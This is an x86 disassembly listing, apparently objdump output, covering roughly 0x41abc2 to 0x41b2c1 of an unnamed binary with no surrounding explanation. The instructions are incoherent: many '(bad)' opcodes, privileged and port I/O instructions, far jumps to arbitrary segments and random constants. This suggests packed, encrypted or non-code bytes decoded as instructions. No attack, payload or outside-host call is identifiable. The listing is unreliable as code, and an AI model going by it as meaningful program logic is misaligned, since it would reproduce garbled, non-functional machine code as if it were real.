  41abc2:	fistp  QWORD PTR [esi+0x1f0fef3d]
  41abc8:	jecxz  0x41ac48
  41abca:	out    dx,al
  41abcb:	std    
  41abcc:	mov    al,0xc8
  41abce:	dec    eax
  41abcf:	test   eax,0xa6b0a6b8
  41abd4:	adc    ecx,esp
  41abd6:	xchg   ebx,eax
  41abd7:	je     0x41ac3a
  41abd9:	call   0xa664:0x2bb5efb9
  41abe0:	lods   eax,DWORD PTR ds:[esi]
  41abe1:	sbb    edx,DWORD PTR [edi+esi*4]
  41abe4:	or     DWORD PTR [ecx+ebx*2],esi
  41abe7:	pop    es
  41abe8:	and    al,0x19
  41abea:	fwait
  41abeb:	stos   BYTE PTR es:[edi],al
  41abec:	frstor [ebp-0x4]
  41abef:	cmp    DWORD PTR [edi+0x27ffaa30],esi
  41abf5:	add    eax,0x8a354fef
  41abfa:	jmp    0x41abb6
  41abfc:	outs   dx,DWORD PTR cs:[esi]
  41abfe:	cmp    ecx,edi
  41ac00:	mov    dh,0x9a
  41ac02:	inc    esi
  41ac03:	sbb    eax,0x6367ad49
  41ac08:	mov    cl,0x44
  41ac0a:	into   
  41ac0b:	pushf  
  41ac0c:	arpl   WORD PTR [edx+0x5f],si
  41ac0f:	scas   eax,DWORD PTR es:[edi]
  41ac10:	sub    eax,0x6553eb41
  41ac15:	or     dl,al
  41ac17:	sub    ebx,DWORD PTR [eax]
  41ac19:	cs xor al,0x3
  41ac1c:	inc    esp
  41ac1d:	mov    WORD PTR [ebx],ds
  41ac1f:	aam    0xb5
  41ac21:	cmp    ebp,DWORD PTR [edx-0x665fa034]
  41ac27:	and    BYTE PTR [ebx-0x65],ch
  41ac2a:	scas   al,BYTE PTR es:[edi]
  41ac2b:	xor    bl,ch
  41ac2d:	fucomp st(2)
  41ac2f:	sub    BYTE PTR [edx],bl
  41ac31:	mov    bh,0x3c
  41ac34:	sahf   
  41ac35:	ficomp DWORD PTR [edi-0x33b084b6]
  41ac3b:	fistp  DWORD PTR [esi]
  41ac3d:	jno    0x41ac89
  41ac3f:	xor    BYTE PTR [ecx-0x40],0x24
  41ac43:	dec    ebx
  41ac44:	scas   al,BYTE PTR es:[edi]
  41ac45:	fs dec esp
  41ac47:	mov    eax,0x44794435
  41ac4c:	repz xor eax,0xb407fc9e
  41ac52:	mov    bl,0xba
  41ac54:	mov    esp,esi
  41ac56:	cmp    esi,eax
  41ac58:	sub    al,0xa2
  41ac5a:	ds in  eax,0x7e
  41ac5d:	cmp    al,0x72
  41ac5f:	ss jbe 0x41ac9e
  41ac62:	adc    al,0x5
  41ac64:	cmp    ecx,eax
  41ac66:	sbb    al,BYTE PTR [esi+ebx*2+0x4edc173e]
  41ac6d:	sub    esi,DWORD PTR [ebx+ebp*4]
  41ac70:	add    al,0xc0
  41ac72:	cmc    
  41ac73:	stos   DWORD PTR es:[edi],eax
  41ac74:	mov    ds,WORD PTR [edi]
  41ac76:	sar    BYTE PTR [ecx+0x1e],0xe3
  41ac7a:	and    DWORD PTR [edi+0x66],0xffffffe8
  41ac7e:	loop   0x41aca0
  41ac80:	div    DWORD PTR [esp+esi*4+0x2b6a44e6]
  41ac87:	sbb    BYTE PTR [edi+0x364d44a8],0xbd
  41ac8e:	mov    eax,0xb86d12ea
  41ac93:	jnp    0x41ac98
  41ac95:	rsm    
  41ac97:	xor    BYTE PTR [edi-0x11],cl
  41ac9a:	mov    edx,0x68d1d4f3
  41ac9f:	jns    0x41ac56
  41aca1:	std    
  41aca2:	gs popf 
  41aca4:	pop    eax
  41aca5:	or     bh,BYTE PTR [eax-0x6f5bf7ad]
  41acab:	sar    DWORD PTR [ebp+0x48],cl
  41acae:	and    DWORD PTR ds:0x809431c9,ecx
  41acb4:	outs   dx,BYTE PTR ds:[esi]
  41acb5:	dec    esp
  41acb6:	push   edx
  41acb7:	sti    
  41acb8:	adc    al,dl
  41acba:	(bad)  
  41acbb:	fwait
  41acbc:	dec    esp
  41acbd:	shl    BYTE PTR [ebx],cl
  41acbf:	fwait
  41acc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acc1:	push   ecx
  41acc2:	mov    bh,0x83
  41acc4:	scas   eax,DWORD PTR es:[edi]
  41acc5:	pop    eax
  41acc6:	std    
  41acc7:	jae    0x41acdb
  41acc9:	and    bh,BYTE PTR [ebx+0x61]
  41accc:	clc    
  41accd:	stc    
  41acce:	aad    0xae
  41acd0:	mov    al,dl
  41acd2:	pushf  
  41acd3:	call   DWORD PTR [ecx-0x42d97fc2]
  41acd9:	mov    dh,0xec
  41acdb:	xchg   ecx,eax
  41acdc:	scas   al,BYTE PTR es:[edi]
  41acdd:	das    
  41acde:	jns    0x41ad36
  41ace0:	pop    eax
  41ace1:	fs cmp eax,0x4dcb9e70
  41ace7:	dec    edi
  41ace8:	cmp    eax,DWORD PTR [edx-0x2a9bd822]
  41acee:	div    BYTE PTR [edx-0x3cf5a010]
  41acf4:	pop    ss
  41acf5:	shl    DWORD PTR [esi+0x355216cd],cl
  41acfb:	add    BYTE PTR [eax+0x4c],dh
  41acfe:	inc    edx
  41acff:	mov    esi,0xcc1b7970
  41ad04:	cmp    ebp,DWORD PTR [edx-0x54]
  41ad07:	adc    dh,bh
  41ad09:	stos   DWORD PTR es:[edi],eax
  41ad0a:	jle    0x41ad66
  41ad0c:	adc    al,0x32
  41ad0e:	aad    0xd2
  41ad10:	sbb    DWORD PTR [edx-0x66b2454],0xffffffe9
  41ad17:	popf   
  41ad18:	or     al,0xc9
  41ad1a:	mov    dh,0x60
  41ad1c:	fstp   TBYTE PTR [ecx+0x7f]
  41ad1f:	cmp    eax,DWORD PTR [edi-0x62]
  41ad22:	jo     0x41ad56
  41ad24:	add    DWORD PTR ss:[ebp+0x1f],esi
  41ad28:	fisttp QWORD PTR [ebx]
  41ad2a:	mov    esi,0xd7950332
  41ad2f:	xor    al,0x7d
  41ad31:	pop    edi
  41ad32:	(bad)  
  41ad33:	xchg   esi,eax
  41ad34:	aad    0xe0
  41ad36:	pop    ebp
  41ad37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad38:	call   0x4d57:0x2ad63e51
  41ad3f:	fsubr  DWORD PTR [eax+ebx*8]
  41ad42:	push   edi
  41ad43:	lea    ecx,[edx+0x71]
  41ad46:	cmp    al,0x23
  41ad48:	adc    esp,DWORD PTR [eax]
  41ad4a:	xlat   BYTE PTR ds:[ebx]
  41ad4b:	and    dh,BYTE PTR [ebx]
  41ad4d:	xor    eax,0xcd0a5e9b
  41ad52:	dec    edx
  41ad53:	aaa    
  41ad54:	add    bl,bh
  41ad56:	inc    edi
  41ad57:	rsqrtps xmm3,XMMWORD PTR [esp+eax*4+0x23]
  41ad5c:	pop    ecx
  41ad5d:	repz push es
  41ad5f:	mov    cl,0x9b
  41ad61:	hlt    
  41ad62:	mov    ebp,0x69591870
  41ad67:	nop
  41ad68:	xor    DWORD PTR ds:0xf8638fc6,esp
  41ad6e:	mov    ds:0x7934c40d,al
  41ad73:	leave  
  41ad74:	xor    edi,DWORD PTR [edx+0x6b]
  41ad77:	xchg   esp,eax
  41ad78:	fldcw  WORD PTR [edi-0x1a]
  41ad7b:	(bad)  
  41ad7d:	xor    esi,DWORD PTR [edi+0x69]
  41ad80:	push   ebp
  41ad81:	(bad)  
  41ad82:	repnz mov ah,0xa3
  41ad85:	aam    0xc8
  41ad87:	js     0x41ad21
  41ad89:	mov    edi,0xd437040b
  41ad8e:	iret   
  41ad8f:	arpl   WORD PTR ds:0x65875800,cx
  41ad95:	call   0xa327:0x148204ec
  41ad9c:	stos   BYTE PTR es:[edi],al
  41ad9d:	pop    ss
  41ad9e:	sub    BYTE PTR [edx],0xb3
  41ada1:	pop    ss
  41ada2:	(bad)  
  41ada3:	and    eax,0x9012e7bc
  41ada8:	push   edx
  41ada9:	pop    ebp
  41adaa:	sbb    eax,0xc62af5cb
  41adaf:	mov    ds:0x474bdda6,al
  41adb4:	fdivp  st(5),st
  41adb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adb7:	mov    ebp,0x569d33c4
  41adbc:	jecxz  0x41ad76
  41adbe:	push   edx
  41adbf:	(bad)  
  41adc0:	cmp    dl,BYTE PTR [edx+ebp*2+0x4d90f9b9]
  41adc7:	jnp    0x41ad7c
  41adc9:	into   
  41adca:	or     BYTE PTR ds:0x43aa8c34,al
  41add0:	xlat   BYTE PTR ds:[ebx]
  41add1:	mov    esp,0x30a29f34
  41add6:	cdq    
  41add7:	xor    BYTE PTR ds:0xa1e55bec,dh
  41addd:	std    
  41adde:	pop    ds
  41addf:	pop    edi
  41ade0:	jecxz  0x41ae33
  41ade2:	push   ebp
  41ade3:	lods   al,BYTE PTR ds:[esi]
  41ade4:	fsubr  QWORD PTR [ebp-0x6ff345bf]
  41adea:	dec    esi
  41adeb:	add    eax,0x6169da2
  41adf0:	or     esp,ebp
  41adf2:	push   edi
  41adf3:	ret    0x428
  41adf6:	loopne 0x41ae53
  41adf8:	out    dx,al
  41adf9:	fimul  DWORD PTR [esp+eax*4]
  41adfc:	dec    ecx
  41adfd:	xchg   DWORD PTR [edx],edi
  41adff:	push   cs
  41ae00:	push   esi
  41ae01:	mov    ah,BYTE PTR [edi-0x51ce92ea]
  41ae07:	jbe    0x41ae29
  41ae09:	inc    eax
  41ae0a:	arpl   WORD PTR [esi+0x57],cx
  41ae0d:	inc    esi
  41ae0e:	lds    esi,FWORD PTR [edx+0x12]
  41ae11:	adc    ah,bh
  41ae13:	xchg   edi,eax
  41ae14:	mov    WORD PTR ds:0x3abe24c1,?
  41ae1a:	add    dl,ah
  41ae1c:	dec    edi
  41ae1d:	xchg   esp,eax
  41ae1e:	arpl   WORD PTR [edi],di
  41ae20:	cmp    ecx,DWORD PTR [esp+eiz*2-0x4e]
  41ae24:	fild   QWORD PTR [edx+0x7d605aab]
  41ae2a:	hlt    
  41ae2b:	fistp  WORD PTR [esi+esi*2+0xe]
  41ae2f:	push   ebx
  41ae30:	lods   eax,DWORD PTR fs:[esi]
  41ae32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae33:	add    BYTE PTR [eax-0x7257d748],cl
  41ae39:	sbb    ecx,DWORD PTR [edi-0x2bfb8644]
  41ae3f:	jmp    0x41ae76
  41ae41:	(bad)  
  41ae42:	nop
  41ae43:	in     al,0xd4
  41ae45:	or     eax,0x4833e3e8
  41ae4a:	inc    ebp
  41ae4b:	jle    0x41aeb0
  41ae4d:	push   esp
  41ae4e:	sti    
  41ae4f:	ins    BYTE PTR es:[edi],dx
  41ae50:	cmp    ebx,DWORD PTR [eax]
  41ae52:	pop    eax
  41ae53:	mov    esp,0x30be32bf
  41ae58:	xlat   BYTE PTR ds:[ebx]
  41ae59:	pop    esi
  41ae5a:	lods   al,BYTE PTR ds:[esi]
  41ae5b:	sbb    eax,0x96f14bf3
  41ae60:	add    edx,ebx
  41ae62:	xchg   edi,eax
  41ae63:	push   es
  41ae64:	pop    edx
  41ae65:	outs   dx,BYTE PTR ds:[esi]
  41ae66:	jo     0x41aead
  41ae68:	xchg   BYTE PTR [edx+0x47],bl
  41ae6b:	dec    ecx
  41ae6c:	mov    eax,0x894defef
  41ae71:	or     eax,0x44ab3ae
  41ae76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae77:	mov    BYTE PTR [edx],bl
  41ae79:	add    esp,DWORD PTR [esi+0x3d]
  41ae7c:	loop   0x41ae61
  41ae7e:	sar    BYTE PTR [ebx+0x75],0x14
  41ae82:	xlat   BYTE PTR ds:[ebx]
  41ae83:	inc    ebp
  41ae84:	ss jmp 0x7ca3:0x9c53f415
  41ae8c:	mov    dh,0x6c
  41ae8e:	push   edx
  41ae8f:	mov    ?,WORD PTR [ecx+0xf]
  41ae92:	or     esp,DWORD PTR [eax-0x72]
  41ae95:	cmp    ecx,edx
  41ae97:	add    BYTE PTR [esi],0xb2
  41ae9a:	and    eax,DWORD PTR [ebx-0x1743d0bb]
  41aea0:	test   BYTE PTR [ecx+ebx*2+0x45040313],al
  41aea7:	sti    
  41aea8:	sub    BYTE PTR [edx],bh
  41aeaa:	and    DWORD PTR [ebp+0x6e],ecx
  41aead:	test   edx,ecx
  41aeaf:	imul   edi,DWORD PTR [esi-0x6b892ea],0x61168255
  41aeb9:	fdivr  st(4),st
  41aebb:	adc    BYTE PTR [ebx-0x56],al
  41aebe:	ss pushf 
  41aec0:	dec    esi
  41aec1:	inc    ebx
  41aec2:	(bad)  
  41aec3:	std    
  41aec4:	cmp    ecx,DWORD PTR [ecx+0x65817938]
  41aeca:	ja     0x41ae84
  41aecc:	ret    0x77b6
  41aecf:	clc    
  41aed0:	loopne 0x41aeca
  41aed2:	les    ax,DWORD PTR [edi+0x63]
  41aed6:	xchg   esi,eax
  41aed7:	dec    eax
  41aed8:	xchg   ecx,eax
  41aed9:	inc    ebp
  41aeda:	ficomp WORD PTR [edi-0xc]
  41aedd:	out    dx,al
  41aede:	int3   
  41aedf:	leave  
  41aee0:	scas   al,BYTE PTR es:[edi]
  41aee1:	pop    es
  41aee2:	addr16 nop
  41aee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aee5:	stos   DWORD PTR es:[edi],eax
  41aee6:	cmp    al,0x63
  41aee8:	icebp  
  41aee9:	mov    ds:0x70e64135,al
  41aeee:	loop   0x41ae77
  41aef0:	sub    BYTE PTR [edi],bl
  41aef2:	add    bl,ah
  41aef4:	inc    ecx
  41aef5:	outs   dx,DWORD PTR ds:[esi]
  41aef6:	cdq    
  41aef7:	jle    0x41aeca
  41aef9:	sub    dl,BYTE PTR [ebp-0x6b]
  41aefc:	xchg   BYTE PTR [ecx+0x1972c026],ch
  41af02:	sbb    ebp,ebx
  41af04:	stc    
  41af05:	xchg   edx,eax
  41af06:	jno    0x41af29
  41af08:	mov    eax,0xa3c59ca8
  41af0d:	mov    al,0xb1
  41af0f:	aam    0xbe
  41af11:	adc    BYTE PTR [ecx+esi*8+0x68],bl
  41af15:	xor    al,0x8e
  41af17:	fsub   DWORD PTR [eax-0x64]
  41af1a:	push   0x1951e3bc
  41af1f:	ja     0x41af05
  41af21:	cmp    eax,0xf2fdec82
  41af26:	faddp  st(7),st
  41af28:	jae    0x41af90
  41af2a:	push   0xffffffea
  41af2c:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41af2e:	xchg   ecx,eax
  41af2f:	out    0x83,eax
  41af31:	into   
  41af32:	int    0xfc
  41af34:	adc    ebx,DWORD PTR [eax+0x6a41bbca]
  41af3a:	mov    BYTE PTR [eax],bh
  41af3c:	fild   QWORD PTR [eax]
  41af3e:	xlat   BYTE PTR ds:[ebx]
  41af3f:	adc    BYTE PTR [ebp+0x48b473d3],0xd0
  41af46:	dec    edx
  41af47:	adc    ecx,eax
  41af49:	and    BYTE PTR [ebx-0x1c],al
  41af4c:	mov    ah,BYTE PTR [ecx+ebp*8+0x7d]
  41af50:	pop    ecx
  41af51:	push   esi
  41af52:	and    al,0xc
  41af54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af56:	out    dx,eax
  41af57:	daa    
  41af58:	lods   al,BYTE PTR ds:[esi]
  41af59:	mov    ds:0x36e82ecb,eax
  41af5e:	out    0xcb,al
  41af60:	push   ds
  41af61:	lahf   
  41af62:	cli    
  41af63:	or     al,0xc3
  41af65:	nop
  41af66:	xlat   BYTE PTR ds:[ebx]
  41af67:	pop    es
  41af68:	nop
  41af69:	xchg   ebp,eax
  41af6a:	cs or  ecx,esi
  41af6d:	outs   dx,BYTE PTR ds:[esi]
  41af6e:	dec    ecx
  41af6f:	dec    edx
  41af70:	cmp    al,0xb6
  41af72:	rcr    BYTE PTR [ebx-0x1d2c2c10],0xe0
  41af79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af7a:	jns    0x41af41
  41af7c:	arpl   WORD PTR [edx],sp
  41af7e:	hlt    
  41af7f:	cmp    dh,BYTE PTR [ecx+0x49]
  41af82:	(bad)  
  41af83:	xchg   edx,eax
  41af84:	test   BYTE PTR [eax],dh
  41af86:	loope  0x41afa5
  41af88:	mov    eax,ds:0x20fe9ae
  41af8d:	nop
  41af8e:	push   cs
  41af8f:	jmp    0x41af8d
  41af91:	dec    ecx
  41af92:	pop    ds
  41af93:	jg     0x41af8c
  41af95:	inc    esi
  41af96:	stos   DWORD PTR es:[edi],eax
  41af97:	or     cl,bl
  41af99:	mov    eax,0xa750431f
  41af9e:	inc    eax
  41af9f:	or     edx,esp
  41afa1:	inc    ebx
  41afa2:	sbb    DWORD PTR [ebp+eiz*2-0x6f],esi
  41afa6:	jnp    0x41af70
  41afa8:	loope  0x41af92
  41afaa:	mov    dl,0xf8
  41afac:	ins    BYTE PTR es:[edi],dx
  41afad:	mov    esp,0x77adc9e8
  41afb2:	xor    al,0x84
  41afb4:	ins    DWORD PTR es:[edi],dx
  41afb5:	pop    es
  41afb6:	xlat   BYTE PTR ds:[ebx]
  41afb7:	cwde   
  41afb8:	aam    0x95
  41afba:	pop    ebx
  41afbb:	test   BYTE PTR [edx+0x53020f3d],ah
  41afc1:	add    DWORD PTR [edx+0x64],ecx
  41afc4:	mov    esp,ss
  41afc6:	jl     0x41b019
  41afc8:	cli    
  41afc9:	aam    0xb6
  41afcb:	int3   
  41afcc:	push   es
  41afcd:	bound  ebx,QWORD PTR [eax+0x6]
  41afd0:	push   edi
  41afd1:	sbb    al,0xe1
  41afd3:	gs jmp 0xcb6b:0x86073d7a
  41afdb:	cwde   
  41afdc:	addr16 std 
  41afde:	sbb    al,BYTE PTR [esi-0x30409482]
  41afe4:	mov    bh,0x42
  41afe6:	xchg   edi,eax
  41afe7:	test   DWORD PTR [ecx],esp
  41afe9:	test   eax,0x9612bbe0
  41afee:	add    al,0xb6
  41aff0:	shl    BYTE PTR [ebx+0x6ce9229e],0xa9
  41aff7:	mov    al,0xdf
  41aff9:	fisub  WORD PTR [ebx-0x73]
  41affc:	mov    esi,0xc4b9e690
  41b001:	mov    eax,ds:0xabd3c81c
  41b006:	fbld   TBYTE PTR [ebx-0x2f26520]
  41b00c:	dec    edx
  41b00d:	pushf  
  41b00e:	pusha  
  41b00f:	rcl    DWORD PTR [ebx-0x520394a6],0xae
  41b016:	jbe    0x41aff7
  41b018:	out    0x70,eax
  41b01a:	inc    edi
  41b01c:	mov    esp,0x61aed513
  41b021:	pop    ds
  41b022:	cmp    eax,0x6ddb433d
  41b027:	pop    edi
  41b028:	(bad)  
  41b029:	iret   
  41b02a:	sub    al,0xdc
  41b02c:	pop    ds
  41b02d:	sub    ecx,ebp
  41b02f:	rol    bl,cl
  41b031:	jno    0x41b03a
  41b033:	fcom   DWORD PTR [edx+0x205e95c3]
  41b039:	fs mov edi,0x7b61738
  41b03f:	mov    ss,WORD PTR [ecx+0x56f6438c]
  41b045:	nop
  41b046:	hlt    
  41b047:	xchg   edx,ebx
  41b049:	(bad)  
  41b04a:	jb     0x41b074
  41b04c:	mov    edx,0x686b7906
  41b051:	(bad)  
  41b052:	jmp    0x41b0a7
  41b054:	lods   eax,DWORD PTR ds:[esi]
  41b055:	sub    DWORD PTR [ecx+0x769fd99f],ecx
  41b05b:	neg    BYTE PTR [edx-0x52a605f1]
  41b061:	mov    esp,esp
  41b063:	sahf   
  41b064:	mov    ds:0x1724498a,al
  41b069:	bound  esp,QWORD PTR [edx]
  41b06b:	aaa    
  41b06c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b06d:	fistp  QWORD PTR ds:0xad52122e
  41b073:	test   eax,0x18d36f20
  41b078:	lods   al,BYTE PTR ds:[esi]
  41b079:	adc    ecx,esp
  41b07b:	inc    edi
  41b07c:	xchg   ebp,eax
  41b07d:	in     eax,0xc9
  41b07f:	pop    edx
  41b080:	jecxz  0x41b0a1
  41b082:	stos   BYTE PTR es:[edi],al
  41b083:	mov    bh,0x6d
  41b085:	fwait
  41b086:	daa    
  41b087:	sub    esp,esp
  41b089:	push   di
  41b08b:	add    al,0xa1
  41b08d:	add    edi,DWORD PTR [eax]
  41b08f:	les    edx,FWORD PTR [edx]
  41b091:	test   eax,0x87817c4b
  41b096:	jle    0x41b04f
  41b098:	push   esi
  41b099:	daa    
  41b09a:	xchg   esp,eax
  41b09b:	(bad)  
  41b09d:	outs   dx,DWORD PTR ds:[esi]
  41b09e:	daa    
  41b09f:	sub    al,0xf4
  41b0a1:	and    BYTE PTR [edi],dh
  41b0a3:	pop    eax
  41b0a4:	xchg   edi,eax
  41b0a5:	std    
  41b0a6:	frndint 
  41b0a8:	push   ss
  41b0a9:	mov    edi,ecx
  41b0ab:	or     al,0xd8
  41b0ad:	and    DWORD PTR [eax+edi*8],ebx
  41b0b0:	ret    
  41b0b1:	loop   0x41b102
  41b0b3:	mov    edi,DWORD PTR [eax+eiz*1-0x72]
  41b0b7:	imul   ecx,DWORD PTR [eax+0x39],0xffffffaf
  41b0bb:	and    al,0xa
  41b0bd:	and    ch,BYTE PTR ds:0x2d69b108
  41b0c3:	cld    
  41b0c4:	in     al,0x6f
  41b0c6:	xchg   ecx,eax
  41b0c7:	add    DWORD PTR [edx-0x45],ecx
  41b0ca:	inc    ebx
  41b0cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0cc:	mov    ecx,0xcedde5c9
  41b0d1:	fsubr  st,st(3)
  41b0d3:	retf   
  41b0d4:	sub    esp,eax
  41b0d6:	(bad)  
  41b0d7:	imul   DWORD PTR [ebx+edx*8]
  41b0da:	fcomp  DWORD PTR [ebx+0x4a]
  41b0dd:	mov    ebp,0x30851a20
  41b0e2:	int3   
  41b0e3:	adc    al,0xfd
  41b0e5:	push   ds
  41b0e6:	(bad)  
  41b0e7:	push   esp
  41b0e8:	inc    esp
  41b0e9:	xor    eax,0x763a92a6
  41b0ee:	xchg   esi,eax
  41b0ef:	nop
  41b0f0:	add    cl,cl
  41b0f2:	mov    edx,0x166da923
  41b0f7:	aaa    
  41b0f8:	shl    DWORD PTR [ebx+0x3],0x16
  41b0fc:	inc    ebx
  41b0fd:	inc    eax
  41b0fe:	push   esp
  41b0ff:	push   ebx
  41b100:	xchg   esi,esp
  41b102:	mov    al,0x88
  41b104:	test   eax,0xc05ec41a
  41b109:	xor    eax,0x8e4e26f8
  41b10e:	repz adc edi,edi
  41b111:	xlat   BYTE PTR ds:[ebx]
  41b112:	iret   
  41b113:	in     eax,dx
  41b114:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b115:	pop    ds
  41b116:	inc    ecx
  41b117:	int3   
  41b118:	inc    BYTE PTR [edi]
  41b11a:	data16 mov ch,0xc0
  41b11d:	mov    ds:0xb058ab4d,eax
  41b122:	xchg   DWORD PTR [edx+0x73f3c5db],ebx
  41b128:	jno    0x41b184
  41b12a:	js     0x41b1a9
  41b12c:	add    BYTE PTR [edi+0x16],bh
  41b12f:	push   cs
  41b130:	dec    esi
  41b131:	repz sti 
  41b133:	or     ch,cl
  41b135:	sub    eax,ecx
  41b137:	cmp    al,0x75
  41b139:	(bad)  
  41b13a:	mov    esp,0x70ac1643
  41b13f:	push   eax
  41b140:	pop    edx
  41b141:	(bad)  
  41b142:	out    dx,eax
  41b143:	mov    ebp,0xf947bf0a
  41b148:	scas   eax,DWORD PTR es:[edi]
  41b149:	test   al,0xe6
  41b14b:	aas    
  41b14c:	icebp  
  41b14d:	jle    0x41b1ab
  41b14f:	jge    0x41b17a
  41b151:	cmp    eax,0x7373e0e2
  41b156:	call   0xe67ca12b
  41b15b:	jl     0x41b11c
  41b15d:	test   al,0x6a
  41b15f:	mov    bh,0x7a
  41b161:	call   0x42d9:0x6cfa57a6
  41b168:	in     eax,dx
  41b169:	push   ss
  41b16a:	dec    edi
  41b16b:	(bad)  
  41b16c:	arpl   WORD PTR [esi-0x57],bp
  41b16f:	leave  
  41b170:	outs   dx,BYTE PTR ds:[esi]
  41b171:	inc    ebp
  41b172:	mov    WORD PTR [eax+eax*8-0x23],?
  41b176:	pop    edx
  41b177:	hlt    
  41b178:	es stos DWORD PTR es:[edi],eax
  41b17a:	cmp    BYTE PTR [edi+0x37674255],bh
  41b180:	sub    dl,al
  41b182:	pop    eax
  41b183:	leave  
  41b184:	mov    edx,0x17b7e361
  41b189:	jl     0x41b14a
  41b18b:	push   ds
  41b18c:	nop
  41b18d:	mov    cl,0xe
  41b18f:	outs   dx,BYTE PTR ds:[esi]
  41b190:	jbe    0x41b14a
  41b192:	jmp    0x41b159
  41b194:	clc    
  41b195:	xchg   BYTE PTR [edx-0x726a06bf],dl
  41b19b:	dec    eax
  41b19c:	inc    esp
  41b19d:	dec    ebx
  41b19e:	aam    0xe
  41b1a0:	push   ebp
  41b1a1:	mov    bh,0xb4
  41b1a3:	dec    esp
  41b1a4:	pushf  
  41b1a5:	nop
  41b1a6:	pop    ecx
  41b1a7:	scas   eax,DWORD PTR es:[edi]
  41b1a8:	push   0xbf906d9
  41b1ad:	aaa    
  41b1ae:	ins    BYTE PTR es:[edi],dx
  41b1af:	sbb    ebx,DWORD PTR [eax+0x18]
  41b1b2:	xor    eax,0xdf85406
  41b1b7:	(bad)  
  41b1b8:	ss mov eax,0x254a8fcc
  41b1be:	inc    edx
  41b1bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1c0:	ror    BYTE PTR [edx],cl
  41b1c2:	inc    ecx
  41b1c3:	nop
  41b1c4:	test   eax,0x7556166a
  41b1c9:	stc    
  41b1ca:	xchg   DWORD PTR ds:0xabff58a0,edx
  41b1d0:	hlt    
  41b1d1:	xlat   BYTE PTR ds:[ebx]
  41b1d2:	mov    ch,0x60
  41b1d4:	shr    BYTE PTR [ecx],cl
  41b1d6:	(bad)  
  41b1d7:	push   ss
  41b1d8:	jge    0x41b1d6
  41b1da:	stos   BYTE PTR es:[edi],al
  41b1db:	enter  0x8ab2,0x1
  41b1df:	lods   al,BYTE PTR ds:[esi]
  41b1e0:	xchg   edi,eax
  41b1e1:	ret    
  41b1e2:	ins    DWORD PTR es:[edi],dx
  41b1e3:	loopne 0x41b1ae
  41b1e5:	out    0xf9,al
  41b1e7:	jg     0x41b25e
  41b1e9:	xchg   edx,eax
  41b1ea:	test   eax,0x8d053b03
  41b1ef:	jns    0x41b17d
  41b1f1:	inc    edx
  41b1f2:	out    dx,eax
  41b1f3:	(bad)
  41b1f7:	add    ah,BYTE PTR ds:[edx+0x1]
  41b1fb:	jge    0x41b239
  41b1fd:	sbb    ecx,DWORD PTR [edi+0x37]
  41b200:	and    al,0xf
  41b202:	and    BYTE PTR [edi],bh
  41b204:	inc    ebx
  41b205:	and    eax,0x50f9a997
  41b20a:	push   cs
  41b20b:	cdq    
  41b20c:	xor    eax,0x9e63586
  41b211:	lods   al,BYTE PTR ds:[esi]
  41b212:	ins    BYTE PTR es:[edi],dx
  41b213:	aad    0xf7
  41b215:	scas   al,BYTE PTR es:[edi]
  41b216:	xor    al,0xf9
  41b218:	jl     0x41b265
  41b21a:	mov    al,0x6a
  41b21c:	pop    esi
  41b21d:	js     0x41b1df
  41b21f:	sub    dh,BYTE PTR [esi+esi*1]
  41b222:	cmp    DWORD PTR [ecx+0x57],ebx
  41b225:	bound  ebx,QWORD PTR [edx]
  41b227:	cmp    DWORD PTR [edx+0x207b17c9],0xffffffab
  41b22e:	lea    esp,[ecx+0x41]
  41b231:	sbb    BYTE PTR [edx],0x5
  41b234:	stos   BYTE PTR es:[edi],al
  41b235:	dec    ecx
  41b236:	gs xchg edi,eax
  41b238:	xchg   ebx,eax
  41b239:	jmp    0x9932:0x43d4bfc7
  41b240:	xchg   edi,eax
  41b241:	jne    0x41b2a5
  41b243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b244:	cmp    dl,cl
  41b246:	fld    TBYTE PTR [edx+0x23f0c02]
  41b24c:	sub    BYTE PTR [ecx+0x12],0x18
  41b250:	inc    ecx
  41b251:	les    edi,FWORD PTR ds:0xde594351
  41b257:	icebp  
  41b258:	outs   dx,BYTE PTR ds:[esi]
  41b259:	pop    es
  41b25a:	push   ds
  41b25b:	les    edi,FWORD PTR [ebx+ecx*2+0x66426621]
  41b262:	gs aam 0xa7
  41b265:	test   eax,0xad57e557
  41b26a:	and    bh,dl
  41b26c:	retf   0x9889
  41b26f:	and    DWORD PTR [eax+0x27],ebp
  41b272:	cmp    al,0x60
  41b274:	or     eax,0xb1ae6228
  41b279:	mov    ecx,0xd4364f45
  41b27e:	push   0xe1b391ab
  41b283:	rol    ebp,cl
  41b285:	xor    DWORD PTR [esi+edi*1],edi
  41b288:	outs   dx,DWORD PTR ds:[esi]
  41b289:	fwait
  41b28a:	mov    ch,0x4f
  41b28c:	pop    ecx
  41b28d:	pusha  
  41b28e:	inc    ebx
  41b28f:	imul   DWORD PTR [eax-0x3f57d025]
  41b295:	dec    esi
  41b296:	adc    edx,eax
  41b298:	aaa    
  41b299:	aad    0xe6
  41b29b:	mov    bl,dh
  41b29d:	push   esi
  41b29e:	xchg   ah,al
  41b2a0:	lahf   
  41b2a1:	sar    esp,cl
  41b2a3:	div    DWORD PTR [edx]
  41b2a5:	cmp    eax,0xfef5491e
  41b2aa:	scas   eax,DWORD PTR es:[edi]
  41b2ab:	mov    ebp,0xf13d47e4
  41b2b0:	inc    eax
  41b2b1:	adc    edi,edi
  41b2b3:	dec    DWORD PTR [ecx+ecx*8]
  41b2b6:	loope  0x41b2ec
  41b2b8:	mov    cl,ah
  41b2ba:	das    
  41b2bb:	neg    DWORD PTR [ebx+0x27fef53b]
  41b2c1:	add    cl,BYTE PTR ds:0x521b8baf
